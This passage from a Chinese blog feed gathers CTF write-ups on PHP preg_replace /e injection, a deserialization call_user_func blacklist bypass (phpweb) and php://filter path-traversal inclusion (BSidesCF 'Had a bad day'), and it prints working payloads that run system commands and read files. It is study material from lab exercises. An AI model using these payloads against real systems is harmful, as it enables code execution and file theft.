最大替换次数【默认-<span class="hljs-number">1</span>，无数次】, 替换次数)<br></code></pre></td></tr></table></figure><p>意思就是就是把（目标字符串） 根据（正则表达的要求） 替换成什么</p><p>在此之前说明一些东西</p><hr><p><strong>双引号：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$&#123;phpinfo()&#125;</span>&#125;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>能成功执行phpinfo()函数并回显</p><p><strong>单引号：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>无法执行，没有回显</p><p><strong>这是因为双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。</strong></p><p><strong>注意：双引号中的函数不会被执行和替换</strong></p><hr><p>再看一个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(.*)/ei&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, $&#123;<span class="hljs-title function_ invoke__">phpinfo</span>()&#125;);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>成功执行phpinfo()函数。</p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p><strong>反向引用</strong><br><strong>对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，</strong><br><strong>所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。</strong><br><strong>缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，</strong><br><strong>其中 n 为一个标识特定缓冲区的一位或两位十进制数。</strong></p><hr><p><strong>\1 实际上指定的是第一个子匹配项。而这段代码里面的第一个子匹配项就是${phpinfo()}。这样我们就执行了phpinfo。</strong></p><p><strong>&#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）</strong></p><p><strong>因此可以通过preg_replace 的 &#x2F;e 修正符会将 replacement 参数当作 php 代码，并且以 eval 函数的方式执行</strong></p><p><strong>其中在正则表达式中，&#x2F;(.*)&#x2F;ei 是一个匹配任意字符（.）零次或多次（*），并将匹配的内容放入一个捕获组中的正则表达式。</strong></p><p>这里的&#x2F;e修饰符会将preg_replace中的replacement即<code>strtolower(&quot;\\1&quot;)</code>当做PHP代码，参数则是引用匹配到的字符串。</p><p>再实验一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;1&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-string">&quot;$&#123;getFlag()&#125;&quot;</span>);<br></code></pre></td></tr></table></figure><p>成功输出1，说明getFlag函数成功执行。</p><p>所以我们构造payload：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?.</span>*=<span class="hljs-variable">$&#123;</span>getflag()&#125;&amp;cmd=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>发现没有看到flag。</p><p>这是因为.是非法传参，会被转为下划线_，所以我们可以把<code>.*</code>换成<code>\S*</code>表示匹配所有的非空白字符</p><p>最终payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">next</span>.php?\S*=<span class="hljs-variable">$&#123;getflag()&#125;</span>&amp;cmd=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><hr><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>这题主要涉及到这几个知识点</p><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="${phpinfo()}"></a>${phpinfo()}</h3><p>在双引号下的”${phpinfo()}”，这里phpinfo()换成其他函数都行，这里的{phpinfo()}就成了一个变量</p><p>双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。</p><p>所以这样就能成功执行其中的函数。</p><p>例如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> strtolower(<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;getFlag()&#125;</span>&quot;</span>);<br></code></pre></td></tr></table></figure><hr><h3 id="preg-replace、-e"><a href="#preg-replace、-e" class="headerlink" title="preg_replace、&#x2F;e"></a>preg_replace、&#x2F;e</h3><p>preg_replace语法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">preg_replace</span><span class="hljs-params">(<span class="hljs-variable">$pattren</span>,replacement,<span class="hljs-variable">$string</span>)</span></span><br></code></pre></td></tr></table></figure><p>如果pattren正则匹配后加了&#x2F;e后缀，就会将 replacement 参数当作 php 代码，并且以 eval 函数的方式执行</p><hr><h3 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h3><p>在正则中\1 实际上指定的是第一个子匹配项。</p><p>比如</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">preg_replace(<span class="hljs-string">&#x27;/(.*)/ei&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="hljs-variable">$&#123;phpinfo()&#125;</span>);<br></code></pre></td></tr></table></figure><p>这段代码里面的第一个子匹配项就是${phpinfo()}。因为<code>.*</code>是匹配任意字符（<code>.</code>）零次或多次（<code>*</code>）</p><p>这样我们就执行了phpinfo。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> php特性 </tag>
            
            <tag> ${phpinfo()} </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2020朱雀组phpweb1</title>
      <link href="/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84phpweb1/"/>
      <url>/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84phpweb1/</url>
      
        <content type="html"><![CDATA[<h1 id="网鼎杯2020朱雀组phpweb1"><a href="#网鼎杯2020朱雀组phpweb1" class="headerlink" title="网鼎杯2020朱雀组phpweb1"></a>网鼎杯2020朱雀组phpweb1</h1><p>1、首先一打开网页和hackbar是这样的</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84phpweb1-1.png"></p><p>2、最上面一行报错让我们用date_default_timezone_set()函数改时区，然后查看源码发现这里有个post方法提交的隐藏表单</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84phpweb1-2.png"></p><p>传参分别为func和date。</p><p>3、我们用hackbar改post请求的传值</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">默认为<span class="hljs-attribute">func</span>=date&amp;p=Y-m-d+h%3Ai%3As+a<br><br>我们改为<span class="hljs-attribute">func</span>=123&amp;p=123<br></code></pre></td></tr></table></figure><p>报错了，显示call_user_func无法找到名叫123的方法</p><p>4、这里就很明显了，这里post传入的func即为要调用的函数，而p即为函数的参数，然后会将其当做调用函数call_user_func的参数。</p><p>我试了下直接传入<code>func=system&amp;p=ls</code>去命令执行，发现回显Hacker，说明被过滤了。</p><p>这里可以用highlight_file、file_get_contents、show_source读取index.php文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">func</span>=file_get_contents&amp;p=index.php<br></code></pre></td></tr></table></figure><p>成功回显出index.php的代码</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84phpweb1-3.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>    <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>5、我们经过代码审计之后发现过滤了很多函数，但是我们注意到这里有个__destruct魔术方法，该方法会在反序列化后被执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> __destruct() &#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">func</span> != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>         echo gettime(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">func</span>, <span class="hljs-variable">$this</span>-&gt;p);<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>触发该魔术方法后也能执行gettime方法中的call_user_func，并且这里只会对我们传入的函数进行过滤，而参数没有任何过滤。我们传入unserialize函数名，就能绕过黑名单，并且成功执行反序列化，然后就能触发__destruct魔术方法了。</p><p>所以先构造序列化字符串</p><p><strong>这里我们的目标是先执行system(‘ls &#x2F;‘)查看下根目录下文件</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;ls /&quot;</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>());<br><br><span class="hljs-comment">#输出</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>然后构造payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>post提交</p><p>成功查看到根目录下文件</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84phpweb1-4.png"></p><p>6、但是这里文件太多了，这么多文件我们很难找到flag，所以这里使用反引号内联执行加find命令，将find出来的结果赋值给cat执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">最终payoad<br><span class="hljs-keyword">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;cat `find / -name flag*`&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>然后就得到flag了。</p><h2 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h2><p>有点离谱，system不是被过滤了吗，但是我们可以直接将system改为<strong>\system</strong></p><p>就匹配不到了，但是可以直接执行命，可惜没 想到这一步</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">func</span>=\system&amp;p=cat `<span class="hljs-built_in">find</span> / -name flag*`<br></code></pre></td></tr></table></figure><h2 id="linux-find-name模糊查询文件"><a href="#linux-find-name模糊查询文件" class="headerlink" title="linux find -name模糊查询文件"></a>linux find -name模糊查询文件</h2><p>对于在Linux中使用<code>find</code>命令进行模糊查询文件，有几种不同的实现方法：</p><p>1. </p><p>   使用通配符（wildcard）进行模糊匹配：</p>   <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find /path/to/directory -name &quot;*pattern*&quot;<br></code></pre></td></tr></table></figure><p>   该命令将在指定路径下递归查找文件名包含指定模式的文件。<code>*</code>表示任意字符，可以出现在模式的任意位置。</p><p>2. </p><p>   使用正则表达式进行模糊匹配：</p>   <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find /path/to/directory -regex &quot;.*pattern.*&quot;<br></code></pre></td></tr></table></figure><p>   该命令将在指定路径下递归查找文件名匹配指定正则表达式的文件。<code>.*</code>表示任意字符的任意次数，可以出现在模式的任意位置。</p><p>3. </p><p>   结合<code>grep</code>命令进行模糊匹配：</p>   <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find /path/to/directory -type f | grep &quot;pattern&quot;<br></code></pre></td></tr></table></figure><p>   该命令将在指定路径下递归查找文件，并使用<code>grep</code>命令对结果进行过滤，只返回文件名中包含指定模式的文件。</p><p>请注意，在使用以上任何一种方法时，需要将<code>/path/to/directory</code>替换为你要搜索的实际目录路径，将<code>pattern</code>替换为你要模糊匹配的实际模式。</p><p>而且可以配合cat来进行内联执行，将find搜索到的文件名都显示其内容</p><p>例如：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">cat `<span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-built_in">flag</span>*`<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> php反序列化 </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> linux find -name模糊查询文件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BSidesCF2020Hadabadday1</title>
      <link href="/2025/03/20/BSidesCF2020Hadabadday1/"/>
      <url>/2025/03/20/BSidesCF2020Hadabadday1/</url>
      
        <content type="html"><![CDATA[<h2 id="BSidesCF2020Hadabadday1"><a href="#BSidesCF2020Hadabadday1" class="headerlink" title="BSidesCF2020Hadabadday1"></a>BSidesCF2020Hadabadday1</h2><p>1、首先启动靶机并访问，发现是这样一个页面</p><p><img src="/../image/BSidesCF2020Hadabadday1-1.png"></p><p> 点woofers就会显示一张狗的图片，而另一个则是猫</p><p><img src="/../image/BSidesCF2020Hadabadday1-2.png"></p><p>2、注意到url中的get传参<code>?category=woofers</code>我们试试随便传一个值比如1,显示只支持提供woofers和meowers</p><p><img src="/../image/BSidesCF2020Hadabadday1-3.png"></p><p>3、那我们传个woofers1，显示</p><p><img src="/../image/BSidesCF2020Hadabadday1-4.png"></p><p>注意到这里的几个报错，可以发现</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(woofers1.php): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: <span class="hljs-keyword">No</span> such file <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><br>#我们传入的是woofers1，但是他包含的是woofers1.php，说明会自动在传值后加.php后缀。<br>#这里还报出了该页面php文件的地址/var/www/html/<span class="hljs-keyword">index</span>.php<br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(): Failed opening <span class="hljs-string">&#x27;woofers1.php&#x27;</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">&#x27;.:/usr/local/lib/php&#x27;</span>) <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><br>#这里爆出了默认的包含地址，/usr/<span class="hljs-keyword">local</span>/lib/php<br></code></pre></td></tr></table></figure><p>4、到这里基本就有思路了，这里会将我们的get传值后面拼接一个.php，然后当做include的参数。且默认包含地址为&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php，而页面php文件在&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php。</p><p>这里我们用到php include的中的包含特性来构造payload</p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=woofers.php?.<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag<br></code></pre></td></tr></table></figure><p><strong>解释：</strong></p><p><strong>include的特性</strong></p><p><strong>先寻找file路径中有没有&#x2F;</strong></p><p><strong>如果有&#x2F;，判断第一个&#x2F;前的文件存不存在，若不存在，则寻找第一个&#x2F;后面的文件路径，如果还不存在，则返回error</strong></p><p>因为这里woofers.php?.文件不存在，所以会包含后面的flag.php文件</p><p><strong>这里后面的..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php为目录穿越</strong></p><p>5、get传值之后发现没有反应，没有报错，也没有flag回显，这是因为我们虽然成功包含了flag.php，但是include会执行其中代码，并不会回显。所以只要套个filter:&#x2F;&#x2F;伪协议去包含即可</p><p><img src="/../image/BSidesCF2020Hadabadday1-5.png"></p><p>最终payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=woofers.php.<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag<br>?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=woofers.php.<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure><p>拿到base64编码后的flag</p><p><img src="/../image/BSidesCF2020Hadabadday1-6.png"></p><p>解码之后即可拿到flag</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7MjMzMjE1NzktYzgzNS00ZjA0LThhZDMtZTMzZWJhZGVlMTgxfQo/Pgo=</span><br><span class="language-xml"></span><br><span class="language-xml">#base64解码</span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- Can you read this flag? --&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"> <span class="hljs-comment">// flag&#123;23321579-c835-4f04-8ad3-e33ebadee181&#125;</span></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>完结。</p><h2 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h2><p>这里看了下网上的payload：说是get传入的参数不包含”woofers”、“meowers”、“index”则会跳转到else，所以无法直接读取，必须在变量中插入”woofers”、“meowers”、“index”，在filter伪协议中添加无效路径index即可，而且好像不需要目录穿越，也不需要用include特性</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">category=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/index/resource=flag<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2018Fakebook1</title>
      <link href="/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1/"/>
      <url>/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1/</url>
      
